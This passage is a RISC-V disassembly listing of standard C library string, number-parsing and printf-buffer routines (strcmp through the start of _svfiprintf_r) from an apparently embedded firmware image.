80040e0c:	0c729263          	bne	t0,t2,80040ed0 <strcmp+0x154>
80040e10:	02d61663          	bne	a2,a3,80040e3c <strcmp+0xc0>
80040e14:	01052603          	lw	a2,16(a0)
80040e18:	0105a683          	lw	a3,16(a1)
80040e1c:	00f672b3          	and	t0,a2,a5
80040e20:	00f66333          	or	t1,a2,a5
80040e24:	00f282b3          	add	t0,t0,a5
80040e28:	0062e2b3          	or	t0,t0,t1
80040e2c:	0a729c63          	bne	t0,t2,80040ee4 <strcmp+0x168>
80040e30:	01450513          	addi	a0,a0,20
80040e34:	01458593          	addi	a1,a1,20
80040e38:	f4d60ee3          	beq	a2,a3,80040d94 <strcmp+0x18>
80040e3c:	01061713          	slli	a4,a2,0x10
80040e40:	01069793          	slli	a5,a3,0x10
80040e44:	00f71e63          	bne	a4,a5,80040e60 <strcmp+0xe4>
80040e48:	01065713          	srli	a4,a2,0x10
80040e4c:	0106d793          	srli	a5,a3,0x10
80040e50:	40f70533          	sub	a0,a4,a5
80040e54:	0ff57593          	andi	a1,a0,255
80040e58:	02059063          	bnez	a1,80040e78 <strcmp+0xfc>
80040e5c:	00008067          	ret
80040e60:	01075713          	srli	a4,a4,0x10
80040e64:	0107d793          	srli	a5,a5,0x10
80040e68:	40f70533          	sub	a0,a4,a5
80040e6c:	0ff57593          	andi	a1,a0,255
80040e70:	00059463          	bnez	a1,80040e78 <strcmp+0xfc>
80040e74:	00008067          	ret
80040e78:	0ff77713          	andi	a4,a4,255
80040e7c:	0ff7f793          	andi	a5,a5,255
80040e80:	40f70533          	sub	a0,a4,a5
80040e84:	00008067          	ret
80040e88:	00054603          	lbu	a2,0(a0)
80040e8c:	0005c683          	lbu	a3,0(a1)
80040e90:	00150513          	addi	a0,a0,1
80040e94:	00158593          	addi	a1,a1,1
80040e98:	00d61463          	bne	a2,a3,80040ea0 <strcmp+0x124>
80040e9c:	fe0616e3          	bnez	a2,80040e88 <strcmp+0x10c>
80040ea0:	40d60533          	sub	a0,a2,a3
80040ea4:	00008067          	ret
80040ea8:	00450513          	addi	a0,a0,4
80040eac:	00458593          	addi	a1,a1,4
80040eb0:	fcd61ce3          	bne	a2,a3,80040e88 <strcmp+0x10c>
80040eb4:	00000513          	li	a0,0
80040eb8:	00008067          	ret
80040ebc:	00850513          	addi	a0,a0,8
80040ec0:	00858593          	addi	a1,a1,8
80040ec4:	fcd612e3          	bne	a2,a3,80040e88 <strcmp+0x10c>
80040ec8:	00000513          	li	a0,0
80040ecc:	00008067          	ret
80040ed0:	00c50513          	addi	a0,a0,12
80040ed4:	00c58593          	addi	a1,a1,12
80040ed8:	fad618e3          	bne	a2,a3,80040e88 <strcmp+0x10c>
80040edc:	00000513          	li	a0,0
80040ee0:	00008067          	ret
80040ee4:	01050513          	addi	a0,a0,16
80040ee8:	01058593          	addi	a1,a1,16
80040eec:	f8d61ee3          	bne	a2,a3,80040e88 <strcmp+0x10c>
80040ef0:	00000513          	li	a0,0
80040ef4:	00008067          	ret

80040ef8 <strcpy>:
80040ef8:	00050793          	mv	a5,a0
80040efc:	0005c703          	lbu	a4,0(a1)
80040f00:	00178793          	addi	a5,a5,1
80040f04:	00158593          	addi	a1,a1,1
80040f08:	fee78fa3          	sb	a4,-1(a5)
80040f0c:	fe0718e3          	bnez	a4,80040efc <strcpy+0x4>
80040f10:	00008067          	ret

80040f14 <__strcpy_chk>:
80040f14:	fe010113          	addi	sp,sp,-32
80040f18:	00812c23          	sw	s0,24(sp)
80040f1c:	00050413          	mv	s0,a0
80040f20:	00058513          	mv	a0,a1
80040f24:	00c12623          	sw	a2,12(sp)
80040f28:	00b12423          	sw	a1,8(sp)
80040f2c:	00112e23          	sw	ra,28(sp)
80040f30:	048000ef          	jal	ra,80040f78 <strlen>
80040f34:	00c12603          	lw	a2,12(sp)
80040f38:	00150513          	addi	a0,a0,1
80040f3c:	00812583          	lw	a1,8(sp)
80040f40:	00a67463          	bgeu	a2,a0,80040f48 <__strcpy_chk+0x34>
80040f44:	2cc000ef          	jal	ra,80041210 <__chk_fail>
80040f48:	00b46863          	bltu	s0,a1,80040f58 <__strcpy_chk+0x44>
80040f4c:	00a587b3          	add	a5,a1,a0
80040f50:	fef46ae3          	bltu	s0,a5,80040f44 <__strcpy_chk+0x30>
80040f54:	00859663          	bne	a1,s0,80040f60 <__strcpy_chk+0x4c>
80040f58:	00a407b3          	add	a5,s0,a0
80040f5c:	fef5e4e3          	bltu	a1,a5,80040f44 <__strcpy_chk+0x30>
80040f60:	00050613          	mv	a2,a0
80040f64:	00040513          	mv	a0,s0
80040f68:	01812403          	lw	s0,24(sp)
80040f6c:	01c12083          	lw	ra,28(sp)
80040f70:	02010113          	addi	sp,sp,32
80040f74:	f3cff06f          	j	800406b0 <memcpy>

80040f78 <strlen>:
80040f78:	00050793          	mv	a5,a0
80040f7c:	00178793          	addi	a5,a5,1
80040f80:	fff7c703          	lbu	a4,-1(a5)
80040f84:	fe071ce3          	bnez	a4,80040f7c <strlen+0x4>
80040f88:	40a78533          	sub	a0,a5,a0
80040f8c:	fff50513          	addi	a0,a0,-1
80040f90:	00008067          	ret

80040f94 <strncat>:
80040f94:	00050793          	mv	a5,a0
80040f98:	0007c703          	lbu	a4,0(a5)
80040f9c:	02071463          	bnez	a4,80040fc4 <strncat+0x30>
80040fa0:	fff60613          	addi	a2,a2,-1
80040fa4:	fff00693          	li	a3,-1
80040fa8:	00d60c63          	beq	a2,a3,80040fc0 <strncat+0x2c>
80040fac:	00158593          	addi	a1,a1,1
80040fb0:	fff5c703          	lbu	a4,-1(a1)
80040fb4:	00178793          	addi	a5,a5,1
80040fb8:	fee78fa3          	sb	a4,-1(a5)
80040fbc:	00071863          	bnez	a4,80040fcc <strncat+0x38>
80040fc0:	00008067          	ret
80040fc4:	00178793          	addi	a5,a5,1
80040fc8:	fd1ff06f          	j	80040f98 <strncat+0x4>
80040fcc:	00061463          	bnez	a2,80040fd4 <strncat+0x40>
80040fd0:	00078023          	sb	zero,0(a5)
80040fd4:	fff60613          	addi	a2,a2,-1
80040fd8:	fd1ff06f          	j	80040fa8 <strncat+0x14>

80040fdc <__strncat_chk>:
80040fdc:	04060e63          	beqz	a2,80041038 <__strncat_chk+0x5c>
80040fe0:	00050793          	mv	a5,a0
80040fe4:	00c6fe63          	bgeu	a3,a2,80041000 <__strncat_chk+0x24>
80040fe8:	ff010113          	addi	sp,sp,-16
80040fec:	00112623          	sw	ra,12(sp)
80040ff0:	220000ef          	jal	ra,80041210 <__chk_fail>
80040ff4:	fe068ae3          	beqz	a3,80040fe8 <__strncat_chk+0xc>
80040ff8:	00178793          	addi	a5,a5,1
80040ffc:	fff68693          	addi	a3,a3,-1
80041000:	0007c703          	lbu	a4,0(a5)
80041004:	fe0718e3          	bnez	a4,80040ff4 <__strncat_chk+0x18>
80041008:	00068813          	mv	a6,a3
8004100c:	00e588b3          	add	a7,a1,a4
80041010:	0008c883          	lbu	a7,0(a7)
80041014:	01178023          	sb	a7,0(a5)
80041018:	00088c63          	beqz	a7,80041030 <__strncat_chk+0x54>
8004101c:	fff80813          	addi	a6,a6,-1
80041020:	fcd704e3          	beq	a4,a3,80040fe8 <__strncat_chk+0xc>
80041024:	00170713          	addi	a4,a4,1
80041028:	00178793          	addi	a5,a5,1
8004102c:	fee610e3          	bne	a2,a4,8004100c <__strncat_chk+0x30>
80041030:	fa080ce3          	beqz	a6,80040fe8 <__strncat_chk+0xc>
80041034:	00078023          	sb	zero,0(a5)
80041038:	00008067          	ret

8004103c <strncpy>:
8004103c:	00050793          	mv	a5,a0
80041040:	00060e63          	beqz	a2,8004105c <strncpy+0x20>
80041044:	00158593          	addi	a1,a1,1
80041048:	fff5c703          	lbu	a4,-1(a1)
8004104c:	00178793          	addi	a5,a5,1
80041050:	fff60613          	addi	a2,a2,-1
80041054:	fee78fa3          	sb	a4,-1(a5)
80041058:	fe0714e3          	bnez	a4,80041040 <strncpy+0x4>
8004105c:	00c78633          	add	a2,a5,a2
80041060:	00c79463          	bne	a5,a2,80041068 <strncpy+0x2c>
80041064:	00008067          	ret
80041068:	00178793          	addi	a5,a5,1
8004106c:	fe078fa3          	sb	zero,-1(a5)
80041070:	ff1ff06f          	j	80041060 <strncpy+0x24>

80041074 <_strtoul_l.isra.0>:
80041074:	80045337          	lui	t1,0x80045
80041078:	00050f93          	mv	t6,a0
8004107c:	00058813          	mv	a6,a1
80041080:	2d530313          	addi	t1,t1,725 # 800452d5 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800452d6>
80041084:	00180713          	addi	a4,a6,1
80041088:	fff74783          	lbu	a5,-1(a4)
8004108c:	00678533          	add	a0,a5,t1
80041090:	00054883          	lbu	a7,0(a0)
80041094:	0088f893          	andi	a7,a7,8
80041098:	0a089063          	bnez	a7,80041138 <_strtoul_l.isra.0+0xc4>
8004109c:	02d00513          	li	a0,45
800410a0:	0aa79063          	bne	a5,a0,80041140 <_strtoul_l.isra.0+0xcc>
800410a4:	00074783          	lbu	a5,0(a4)
800410a8:	00100e13          	li	t3,1
800410ac:	00280713          	addi	a4,a6,2
800410b0:	10068c63          	beqz	a3,800411c8 <_strtoul_l.isra.0+0x154>
800410b4:	01000513          	li	a0,16
800410b8:	02a69463          	bne	a3,a0,800410e0 <_strtoul_l.isra.0+0x6c>
800410bc:	03000513          	li	a0,48
800410c0:	02a79063          	bne	a5,a0,800410e0 <_strtoul_l.isra.0+0x6c>
800410c4:	00074783          	lbu	a5,0(a4)
800410c8:	05800513          	li	a0,88
800410cc:	0df7f793          	andi	a5,a5,223
800410d0:	0ea79463          	bne	a5,a0,800411b8 <_strtoul_l.isra.0+0x144>
800410d4:	00174783          	lbu	a5,1(a4)
800410d8:	01000693          	li	a3,16
800410dc:	00270713          	addi	a4,a4,2
800410e0:	fff00813          	li	a6,-1
800410e4:	02d85eb3          	divu	t4,a6,a3
800410e8:	00000893          	li	a7,0
800410ec:	00000513          	li	a0,0
800410f0:	00900293          	li	t0,9
800410f4:	01900f13          	li	t5,25
800410f8:	02d87333          	remu	t1,a6,a3
800410fc:	fd078813          	addi	a6,a5,-48
80041100:	0502ee63          	bltu	t0,a6,8004115c <_strtoul_l.isra.0+0xe8>
80041104:	00080793          	mv	a5,a6
80041108:	06d7de63          	bge	a5,a3,80041184 <_strtoul_l.isra.0+0x110>
8004110c:	0608c863          	bltz	a7,8004117c <_strtoul_l.isra.0+0x108>
80041110:	fff00893          	li	a7,-1
80041114:	00aeec63          	bltu	t4,a0,8004112c <_strtoul_l.isra.0+0xb8>
80041118:	00ae9463          	bne	t4,a0,80041120 <_strtoul_l.isra.0+0xac>
8004111c:	00f34863          	blt	t1,a5,8004112c <_strtoul_l.isra.0+0xb8>
80041120:	00100893          	li	a7,1
80041124:	02a68833          	mul	a6,a3,a0
80041128:	01078533          	add	a0,a5,a6
8004112c:	00170713          	addi	a4,a4,1
80041130:	fff74783          	lbu	a5,-1(a4)
80041134:	fc9ff06f          	j	800410fc <_strtoul_l.isra.0+0x88>
80041138:	00070813          	mv	a6,a4
8004113c:	f49ff06f          	j	80041084 <_strtoul_l.isra.0+0x10>
80041140:	02b00513          	li	a0,43
80041144:	00a78663          	beq	a5,a0,80041150 <_strtoul_l.isra.0+0xdc>
80041148:	00000e13          	li	t3,0
8004114c:	f65ff06f          	j	800410b0 <_strtoul_l.isra.0+0x3c>
80041150:	00074783          	lbu	a5,0(a4)
80041154:	00280713          	addi	a4,a6,2
80041158:	ff1ff06f          	j	80041148 <_strtoul_l.isra.0+0xd4>
8004115c:	fbf78813          	addi	a6,a5,-65
80041160:	010f6663          	bltu	t5,a6,8004116c <_strtoul_l.isra.0+0xf8>
80041164:	fc978793          	addi	a5,a5,-55
80041168:	fa1ff06f          	j	80041108 <_strtoul_l.isra.0+0x94>
8004116c:	f9f78813          	addi	a6,a5,-97
80041170:	010f6a63          	bltu	t5,a6,80041184 <_strtoul_l.isra.0+0x110>
80041174:	fa978793          	addi	a5,a5,-87
80041178:	f91ff06f          	j	80041108 <_strtoul_l.isra.0+0x94>
8004117c:	fff00893          	li	a7,-1
80041180:	fadff06f          	j	8004112c <_strtoul_l.isra.0+0xb8>
80041184:	0008dc63          	bgez	a7,8004119c <_strtoul_l.isra.0+0x128>
80041188:	02200793          	li	a5,34
8004118c:	00ffa023          	sw	a5,0(t6)
80041190:	fff00513          	li	a0,-1
80041194:	00061c63          	bnez	a2,800411ac <_strtoul_l.isra.0+0x138>
80041198:	00008067          	ret
8004119c:	000e0463          	beqz	t3,800411a4 <_strtoul_l.isra.0+0x130>
800411a0:	40a00533          	neg	a0,a0
800411a4:	02060a63          	beqz	a2,800411d8 <_strtoul_l.isra.0+0x164>
800411a8:	00088463          	beqz	a7,800411b0 <_strtoul_l.isra.0+0x13c>
800411ac:	fff70593          	addi	a1,a4,-1
800411b0:	00b62023          	sw	a1,0(a2)
800411b4:	00008067          	ret
800411b8:	03000793          	li	a5,48
800411bc:	f20692e3          	bnez	a3,800410e0 <_strtoul_l.isra.0+0x6c>
800411c0:	00800693          	li	a3,8
800411c4:	f1dff06f          	j	800410e0 <_strtoul_l.isra.0+0x6c>
800411c8:	03000513          	li	a0,48
800411cc:	eea78ce3          	beq	a5,a0,800410c4 <_strtoul_l.isra.0+0x50>
800411d0:	00a00693          	li	a3,10
800411d4:	f0dff06f          	j	800410e0 <_strtoul_l.isra.0+0x6c>
800411d8:	00008067          	ret

800411dc <_strtoul_r>:
800411dc:	e99ff06f          	j	80041074 <_strtoul_l.isra.0>

800411e0 <strtoul_l>:
800411e0:	800477b7          	lui	a5,0x80047
800411e4:	00060693          	mv	a3,a2
800411e8:	00058613          	mv	a2,a1
800411ec:	00050593          	mv	a1,a0
800411f0:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
800411f4:	e81ff06f          	j	80041074 <_strtoul_l.isra.0>

800411f8 <strtoul>:
800411f8:	800477b7          	lui	a5,0x80047
800411fc:	00060693          	mv	a3,a2
80041200:	00058613          	mv	a2,a1
80041204:	00050593          	mv	a1,a0
80041208:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
8004120c:	e69ff06f          	j	80041074 <_strtoul_l.isra.0>

80041210 <__chk_fail>:
80041210:	fc010113          	addi	sp,sp,-64
80041214:	800465b7          	lui	a1,0x80046
80041218:	02e00613          	li	a2,46
8004121c:	48458593          	addi	a1,a1,1156 # 80046484 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046485>
80041220:	00010513          	mv	a0,sp
80041224:	02112e23          	sw	ra,60(sp)
80041228:	c88ff0ef          	jal	ra,800406b0 <memcpy>
8004122c:	00010513          	mv	a0,sp
80041230:	d49ff0ef          	jal	ra,80040f78 <strlen>
80041234:	00050613          	mv	a2,a0
80041238:	00010593          	mv	a1,sp
8004123c:	00200513          	li	a0,2
80041240:	0fa030ef          	jal	ra,8004433a <_write>
80041244:	00600513          	li	a0,6
80041248:	681000ef          	jal	ra,800420c8 <raise>
8004124c:	07f00513          	li	a0,127
80041250:	102030ef          	jal	ra,80044352 <_exit>

80041254 <__malloc_lock>:
80041254:	00008067          	ret

80041258 <__malloc_unlock>:
80041258:	00008067          	ret

8004125c <__ssputs_r>:
8004125c:	fe010113          	addi	sp,sp,-32
80041260:	01212823          	sw	s2,16(sp)
80041264:	0085a903          	lw	s2,8(a1)
80041268:	00812c23          	sw	s0,24(sp)
8004126c:	01412423          	sw	s4,8(sp)
80041270:	01612023          	sw	s6,0(sp)
80041274:	00112e23          	sw	ra,28(sp)
80041278:	00912a23          	sw	s1,20(sp)
8004127c:	01312623          	sw	s3,12(sp)
80041280:	01512223          	sw	s5,4(sp)
80041284:	00058413          	mv	s0,a1
80041288:	00060b13          	mv	s6,a2
8004128c:	00068a13          	mv	s4,a3
80041290:	0d26ee63          	bltu	a3,s2,8004136c <__ssputs_r+0x110>
80041294:	00c5d783          	lhu	a5,12(a1)
80041298:	4807f713          	andi	a4,a5,1152
8004129c:	0c070663          	beqz	a4,80041368 <__ssputs_r+0x10c>
800412a0:	00042483          	lw	s1,0(s0)
800412a4:	0105a583          	lw	a1,16(a1)
800412a8:	01442703          	lw	a4,20(s0)
800412ac:	00050a93          	mv	s5,a0
800412b0:	40b489b3          	sub	s3,s1,a1
800412b4:	00300493          	li	s1,3
800412b8:	02e484b3          	mul	s1,s1,a4
800412bc:	00200713          	li	a4,2
800412c0:	02e4c4b3          	div	s1,s1,a4
800412c4:	00168713          	addi	a4,a3,1
800412c8:	01370733          	add	a4,a4,s3
800412cc:	00e4f463          	bgeu	s1,a4,800412d4 <__ssputs_r+0x78>
800412d0:	00070493          	mv	s1,a4
800412d4:	4007f793          	andi	a5,a5,1024
800412d8:	0c078463          	beqz	a5,800413a0 <__ssputs_r+0x144>
800412dc:	00048593          	mv	a1,s1
800412e0:	000a8513          	mv	a0,s5
800412e4:	e8cff0ef          	jal	ra,80040970 <_malloc_r>
800412e8:	00050913          	mv	s2,a0
800412ec:	04051263          	bnez	a0,80041330 <__ssputs_r+0xd4>
800412f0:	00c00793          	li	a5,12
800412f4:	00faa023          	sw	a5,0(s5)
800412f8:	00c45783          	lhu	a5,12(s0)
800412fc:	fff00513          	li	a0,-1
80041300:	0407e793          	ori	a5,a5,64
80041304:	00f41623          	sh	a5,12(s0)
80041308:	01c12083          	lw	ra,28(sp)
8004130c:	01812403          	lw	s0,24(sp)
80041310:	01412483          	lw	s1,20(sp)
80041314:	01012903          	lw	s2,16(sp)
80041318:	00c12983          	lw	s3,12(sp)
8004131c:	00812a03          	lw	s4,8(sp)
80041320:	00412a83          	lw	s5,4(sp)
80041324:	00012b03          	lw	s6,0(sp)
80041328:	02010113          	addi	sp,sp,32
8004132c:	00008067          	ret
80041330:	01042583          	lw	a1,16(s0)
80041334:	00098613          	mv	a2,s3
80041338:	b78ff0ef          	jal	ra,800406b0 <memcpy>
8004133c:	00c45783          	lhu	a5,12(s0)
80041340:	b7f7f793          	andi	a5,a5,-1153
80041344:	0807e793          	ori	a5,a5,128
80041348:	00f41623          	sh	a5,12(s0)
8004134c:	01242823          	sw	s2,16(s0)
80041350:	00942a23          	sw	s1,20(s0)
80041354:	01390933          	add	s2,s2,s3
80041358:	413484b3          	sub	s1,s1,s3
8004135c:	01242023          	sw	s2,0(s0)
80041360:	00942423          	sw	s1,8(s0)
80041364:	000a0913          	mv	s2,s4
80041368:	012a7463          	bgeu	s4,s2,80041370 <__ssputs_r+0x114>
8004136c:	000a0913          	mv	s2,s4
80041370:	00042503          	lw	a0,0(s0)
80041374:	00090613          	mv	a2,s2
80041378:	000b0593          	mv	a1,s6
8004137c:	605000ef          	jal	ra,80042180 <memmove>
80041380:	00842783          	lw	a5,8(s0)
80041384:	00000513          	li	a0,0
80041388:	412787b3          	sub	a5,a5,s2
8004138c:	00f42423          	sw	a5,8(s0)
80041390:	00042783          	lw	a5,0(s0)
80041394:	01278933          	add	s2,a5,s2
80041398:	01242023          	sw	s2,0(s0)
8004139c:	f6dff06f          	j	80041308 <__ssputs_r+0xac>
800413a0:	00048613          	mv	a2,s1
800413a4:	000a8513          	mv	a0,s5
800413a8:	635000ef          	jal	ra,800421dc <_realloc_r>
800413ac:	00050913          	mv	s2,a0
800413b0:	f8051ee3          	bnez	a0,8004134c <__ssputs_r+0xf0>
800413b4:	01042583          	lw	a1,16(s0)
800413b8:	000a8513          	mv	a0,s5
800413bc:	ca8ff0ef          	jal	ra,80040864 <_free_r>
800413c0:	f31ff06f          	j	800412f0 <__ssputs_r+0x94>

800413c4 <__ssprint_r>:
800413c4:	00862783          	lw	a5,8(a2)
800413c8:	fd010113          	addi	sp,sp,-48
800413cc:	01312e23          	sw	s3,28(sp)
800413d0:	02112623          	sw	ra,44(sp)
800413d4:	02812423          	sw	s0,40(sp)
800413d8:	02912223          	sw	s1,36(sp)
800413dc:	03212023          	sw	s2,32(sp)
800413e0:	01412c23          	sw	s4,24(sp)
800413e4:	01512a23          	sw	s5,20(sp)
800413e8:	01612823          	sw	s6,16(sp)
800413ec:	01712623          	sw	s7,12(sp)
800413f0:	01812423          	sw	s8,8(sp)
800413f4:	01912223          	sw	s9,4(sp)
800413f8:	01a12023          	sw	s10,0(sp)
800413fc:	00060993          	mv	s3,a2
80041400:	12078463          	beqz	a5,80041528 <__ssprint_r+0x164>
80041404:	00062a83          	lw	s5,0(a2)
80041408:	00050a13          	mv	s4,a0
8004140c:	00058413          	mv	s0,a1
80041410:	00000b13          	li	s6,0
80041414:	00000913          	li	s2,0
80041418:	00300b93          	li	s7,3
8004141c:	00200c13          	li	s8,2
80041420:	08090063          	beqz	s2,800414a0 <__ssprint_r+0xdc>
80041424:	00842d03          	lw	s10,8(s0)
80041428:	0da96063          	bltu	s2,s10,800414e8 <__ssprint_r+0x124>
8004142c:	00c45783          	lhu	a5,12(s0)
80041430:	4807f713          	andi	a4,a5,1152
80041434:	0a070a63          	beqz	a4,800414e8 <__ssprint_r+0x124>
80041438:	00042483          	lw	s1,0(s0)
8004143c:	01042583          	lw	a1,16(s0)
80041440:	40b48cb3          	sub	s9,s1,a1
80041444:	01442483          	lw	s1,20(s0)
80041448:	001c8713          	addi	a4,s9,1
8004144c:	01270733          	add	a4,a4,s2
80041450:	029b84b3          	mul	s1,s7,s1
80041454:	0384c4b3          	div	s1,s1,s8
80041458:	00e4f463          	bgeu	s1,a4,80041460 <__ssprint_r+0x9c>
8004145c:	00070493          	mv	s1,a4
80041460:	4007f793          	andi	a5,a5,1024
80041464:	10078263          	beqz	a5,80041568 <__ssprint_r+0x1a4>
80041468:	00048593          	mv	a1,s1
8004146c:	000a0513          	mv	a0,s4
80041470:	d00ff0ef          	jal	ra,80040970 <_malloc_r>
80041474:	00050d13          	mv	s10,a0
80041478:	02051c63          	bnez	a0,800414b0 <__ssprint_r+0xec>
8004147c:	00c00793          	li	a5,12
80041480:	00fa2023          	sw	a5,0(s4)
80041484:	00c45783          	lhu	a5,12(s0)
80041488:	fff00513          	li	a0,-1
8004148c:	0407e793          	ori	a5,a5,64
80041490:	00f41623          	sh	a5,12(s0)
80041494:	0009a423          	sw	zero,8(s3)
80041498:	0009a223          	sw	zero,4(s3)
8004149c:	0940006f          	j	80041530 <__ssprint_r+0x16c>
800414a0:	000aab03          	lw	s6,0(s5)
800414a4:	004aa903          	lw	s2,4(s5)
800414a8:	008a8a93          	addi	s5,s5,8
800414ac:	f75ff06f          	j	80041420 <__ssprint_r+0x5c>
800414b0:	01042583          	lw	a1,16(s0)
800414b4:	000c8613          	mv	a2,s9
800414b8:	9f8ff0ef          	jal	ra,800406b0 <memcpy>
800414bc:	00c45783          	lhu	a5,12(s0)
800414c0:	b7f7f793          	andi	a5,a5,-1153
800414c4:	0807e793          	ori	a5,a5,128
800414c8:	00f41623          	sh	a5,12(s0)
800414cc:	01a42823          	sw	s10,16(s0)
800414d0:	00942a23          	sw	s1,20(s0)
800414d4:	019d0d33          	add	s10,s10,s9
800414d8:	419484b3          	sub	s1,s1,s9
800414dc:	01a42023          	sw	s10,0(s0)
800414e0:	00942423          	sw	s1,8(s0)
800414e4:	00090d13          	mv	s10,s2
800414e8:	01a97463          	bgeu	s2,s10,800414f0 <__ssprint_r+0x12c>
800414ec:	00090d13          	mv	s10,s2
800414f0:	00042503          	lw	a0,0(s0)
800414f4:	000d0613          	mv	a2,s10
800414f8:	000b0593          	mv	a1,s6
800414fc:	485000ef          	jal	ra,80042180 <memmove>
80041500:	00842783          	lw	a5,8(s0)
80041504:	41a787b3          	sub	a5,a5,s10
80041508:	00f42423          	sw	a5,8(s0)
8004150c:	00042783          	lw	a5,0(s0)
80041510:	01a78d33          	add	s10,a5,s10
80041514:	0089a783          	lw	a5,8(s3)
80041518:	01a42023          	sw	s10,0(s0)
8004151c:	41278933          	sub	s2,a5,s2
80041520:	0129a423          	sw	s2,8(s3)
80041524:	f6091ee3          	bnez	s2,800414a0 <__ssprint_r+0xdc>
80041528:	0009a223          	sw	zero,4(s3)
8004152c:	00000513          	li	a0,0
80041530:	02c12083          	lw	ra,44(sp)
80041534:	02812403          	lw	s0,40(sp)
80041538:	02412483          	lw	s1,36(sp)
8004153c:	02012903          	lw	s2,32(sp)
80041540:	01c12983          	lw	s3,28(sp)
80041544:	01812a03          	lw	s4,24(sp)
80041548:	01412a83          	lw	s5,20(sp)
8004154c:	01012b03          	lw	s6,16(sp)
80041550:	00c12b83          	lw	s7,12(sp)
80041554:	00812c03          	lw	s8,8(sp)
80041558:	00412c83          	lw	s9,4(sp)
8004155c:	00012d03          	lw	s10,0(sp)
80041560:	03010113          	addi	sp,sp,48
80041564:	00008067          	ret
80041568:	00048613          	mv	a2,s1
8004156c:	000a0513          	mv	a0,s4
80041570:	46d000ef          	jal	ra,800421dc <_realloc_r>
80041574:	00050d13          	mv	s10,a0
80041578:	f4051ae3          	bnez	a0,800414cc <__ssprint_r+0x108>
8004157c:	01042583          	lw	a1,16(s0)
80041580:	000a0513          	mv	a0,s4
80041584:	ae0ff0ef          	jal	ra,80040864 <_free_r>
80041588:	ef5ff06f          	j	8004147c <__ssprint_r+0xb8>

8004158c <_svfiprintf_r>:
8004158c:	00c5d783          	lhu	a5,12(a1)
80041590:	f4010113          	addi	sp,sp,-192
80041594:	0a912a23          	sw	s1,180(sp)
80041598:	0b212823          	sw	s2,176(sp)
8004159c:	0b312623          	sw	s3,172(sp)
800415a0:	0a112e23          	sw	ra,188(sp)
800415a4:	0a812c23          	sw	s0,184(sp)
800415a8:	0b412423          	sw	s4,168(sp)
800415ac:	0b512223          	sw	s5,164(sp)
800415b0:	0b612023          	sw	s6,160(sp)
800415b4:	09712e23          	sw	s7,156(sp)
800415b8:	09812c23          	sw	s8,152(sp)
800415bc:	09912a23          	sw	s9,148(sp)
800415c0:	09a12823          	sw	s10,144(sp)
800415c4:	09b12623          	sw	s11,140(sp)
800415c8:	0807f793          	andi	a5,a5,128
800415cc:	00050993          	mv	s3,a0
800415d0:	00058913          	mv	s2,a1
800415d4:	00060493          	mv	s1,a2
800415d8:	06078c63          	beqz	a5,80041650 <_svfiprintf_r+0xc4>
800415dc:	0105a783          	lw	a5,16(a1)
800415e0:	06079863          	bnez	a5,80041650 <_svfiprintf_r+0xc4>
800415e4:	04000593          	li	a1,64
800415e8:	00d12623          	sw	a3,12(sp)
800415ec:	b84ff0ef          	jal	ra,80040970 <_malloc_r>
800415f0:	00a92023          	sw	a0,0(s2)
800415f4:	00a92823          	sw	a0,16(s2)
800415f8:	00c12683          	lw	a3,12(sp)
800415fc:	04051663          	bnez	a0,80041648 <_svfiprintf_r+0xbc>
80041600:	00c00793          	li	a5,12
80041604:	00f9a023          	sw	a5,0(s3)
80041608:	fff00513          	li	a0,-1
8004160c:	0bc12083          	lw	ra,188(sp)
80041610:	0b812403          	lw	s0,184(sp)
80041614:	0b412483          	lw	s1,180(sp)
80041618:	0b012903          	lw	s2,176(sp)
8004161c:	0ac12983          	lw	s3,172(sp)
80041620:	0a812a03          	lw	s4,168(sp)
80041624:	0a412a83          	lw	s5,164(sp)
80041628:	0a012b03          	lw	s6,160(sp)
8004162c:	09c12b83          	lw	s7,156(sp)
80041630:	09812c03          	lw	s8,152(sp)
80041634:	09412c83          	lw	s9,148(sp)
80041638:	09012d03          	lw	s10,144(sp)
8004163c:	08c12d83          	lw	s11,140(sp)
80041640:	0c010113          	addi	sp,sp,192
80041644:	00008067          	ret
80041648:	04000793          	li	a5,64
8004164c:	00f92a23          	sw	a5,20(s2)
80041650:	02000793          	li	a5,32
80041654:	02f10ca3          	sb	a5,57(sp)
80041658:	00000ab7          	lui	s5,0x0
8004165c:	03000793          	li	a5,48
80041660:	02012a23          	sw	zero,52(sp)
80041664:	02f10d23          	sb	a5,58(sp)
80041668:	00d12e23          	sw	a3,28(sp)
8004166c:	02500c93          	li	s9,37
80041670:	80046b37          	lui	s6,0x80046
80041674:	80046bb7          	lui	s7,0x80046
80041678:	80046d37          	lui	s10,0x80046
8004167c:	80041c37          	lui	s8,0x80041
80041680:	000a8a93          	mv	s5,s5
80041684:	00048413          	mv	s0,s1
80041688:	00044783          	lbu	a5,0(s0)
8004168c:	00078463          	beqz	a5,80041694 <_svfiprintf_r+0x108>
80041690:	0d979c63          	bne	a5,s9,80041768 <_svfiprintf_r+0x1dc>
80041694:	40940db3          	sub	s11,s0,s1
80041698:	020d8663          	beqz	s11,800416c4 <_svfiprintf_r+0x138>
8004169c:	000d8693          	mv	a3,s11
800416a0:	00048613          	mv	a2,s1
800416a4:	00090593          	mv	a1,s2
800416a8:	00098513          	mv	a0,s3
800416ac:	bb1ff0ef          	jal	ra,8004125c <__ssputs_r>
800416b0:	fff00793          	li	a5,-1
800416b4:	24f50663          	beq	a0,a5,80041900 <_svfiprintf_r+0x374>
800416b8:	03412683          	lw	a3,52(sp)
800416bc:	01b686b3          	add	a3,a3,s11
800416c0:	02d12a23          	sw	a3,52(sp)
800416c4:	00044783          	lbu	a5,0(s0)
800416c8:	22078c63          	beqz	a5,80041900 <_svfiprintf_r+0x374>
800416cc:	fff00793          	li	a5,-1
800416d0:	00140493          	addi	s1,s0,1
800416d4:	02012023          	sw	zero,32(sp)
800416d8:	02012623          	sw	zero,44(sp)
800416dc:	02f12223          	sw	a5,36(sp)
800416e0:	02012423          	sw	zero,40(sp)
800416e4:	060101a3          	sb	zero,99(sp)
800416e8:	06012c23          	sw	zero,120(sp)
800416ec:	00100d93          	li	s11,1
800416f0:	0004c583          	lbu	a1,0(s1)
800416f4:	00500613          	li	a2,5
